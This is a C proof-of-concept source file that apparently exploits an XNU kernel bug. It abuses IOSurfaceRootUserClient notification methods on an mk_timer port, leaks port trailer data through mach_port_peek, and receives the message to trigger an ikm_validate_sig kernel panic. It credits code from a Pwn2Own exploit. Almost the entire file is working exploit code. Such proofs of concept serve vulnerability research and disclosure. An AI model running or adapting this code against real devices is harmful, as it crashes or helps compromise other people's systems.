#include "poc.h"

void print_hex(char *buf, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        if ( (i > 0) && (i % 0x10 == 0) ) {
            printf("\n");
        }
        printf("0x%02x ", (unsigned char)buf[i]);
    }
    printf("\n");
}

mach_msg_return_t receive_msg(mach_port_name_t recv_port) {
    char buf[0xa0];
    memset(buf, 0x0, sizeof(buf));
    
    mach_msg_return_t ret = mach_msg((mach_msg_header_t *)buf,
                                        MACH_RCV_MSG,                   // option
                                        0,                              // send_size
                                        sizeof(buf),                    // rcv_size
                                        recv_port,                       // rcv_name
                                        MACH_MSG_TIMEOUT_NONE,          // timeout
                                        MACH_PORT_NULL);                // notify
    if (ret != MACH_MSG_SUCCESS) {
        printf("mach_msg MACH_RCV_MSG failed, ret == 0x%x --> %s", ret, mach_error_string(ret));
        return ret;
    }

    print_hex(buf, sizeof(buf));

    return MACH_MSG_SUCCESS;
}

// credit: https://github.com/ret2/Pwn2Own-2021-Safari/blob/d3d86eab234a7ec911614765b7dc559027c256f2/eop/eop_common.c#L831
void mach_port_peek_leak(mach_port_t port) {
    mach_port_seqno_t seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    char trailer[0x50] = { 0 };
    mach_msg_type_number_t trailer_sz = sizeof(trailer);
    
    kern_return_t ret = mach_port_peek(mach_task_self(), port, 3<<24, &seqno, &msg_size, &msg_id, trailer, &trailer_sz);
    if (ret != KERN_SUCCESS) {
        printf("mach_port_peek failed: 0x%x --> %s\n", ret, mach_error_string(ret));
        return;
    }
    
    printf("mach_port_peek:\n");
    printf("\tseq_no == 0x%x\n", seqno);
    printf("\tmsg_size == 0x%x\n", msg_size);
    printf("\tmsg_id == 0x%x\n", msg_id);
    printf("\ttrailer_sz == 0x%x\n", trailer_sz);
    print_hex(trailer, trailer_sz);
}

void *trigger_iosurface_notification(mach_port_t mktimer_port) {
    kern_return_t ret = KERN_SUCCESS;
    io_connect_t conn;
    
    uint64_t inputStructure[3] = { 0 };
    uint64_t scalars[4] = { 0 };
    uint64_t reference[8] = { 0 };
    uint32_t referenceCnt = 1;
    
    conn = get_iosurface_root_uc();
    if (conn == MACH_PORT_NULL) {
        return NULL;
    }
    
    int surface_id = create_surface(conn);
    if (surface_id <= 0) {
        return NULL;
    }
    
    printf("surface_id == %d\n", surface_id);
    
    // IOSurfaceRootUserClient::s_set_surface_notify
    printf("call s_set_surface_notify\n");
    ret = IOConnectCallAsyncMethod(conn,
                                   17,
                                   mktimer_port,
                                   reference, referenceCnt,
                                   NULL, 0,
                                   inputStructure, sizeof(inputStructure),
                                   NULL, NULL,
                                   NULL, NULL);
    
    if (ret != KERN_SUCCESS) {
        printf("external method 17 failed, ret == 0x%x -> %s\n", ret, mach_error_string(ret));
        return NULL;
    }
    
    // IOSurfaceRootUserClient::s_increment_surface_use_count
    printf("call s_increment_surface_use_count\n");
    scalars[0] = surface_id;
    ret = IOConnectCallMethod(conn, 14,
                              scalars, 1,
                              NULL, 0,
                              NULL, NULL,
                              NULL, NULL);

    if (ret != KERN_SUCCESS) {
        printf("external method 14 failed, ret == 0x%x -> %s\n", ret, mach_error_string(ret));
        return NULL;
    }

    printf("call release_surface\n");
    if (release_surface(conn, surface_id) == false) {
        return NULL;
    }
    
    printf("peek:\n");
    mach_port_peek_leak(mktimer_port);

    printf("recv the message, trigger ikm_validate_sig panic\n");
    sleep(2);
    receive_msg(mktimer_port);

    // we shouldn't get here
    printf("done\n");
    
    IOServiceClose(conn);
    
    return NULL;
}


void poc(void) {
    int p = mk_timer_create();
    
    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        
    trigger_iosurface_notification(p);
    
    sleep(10);
}

int main(void) {
    poc();
    return 0;
}

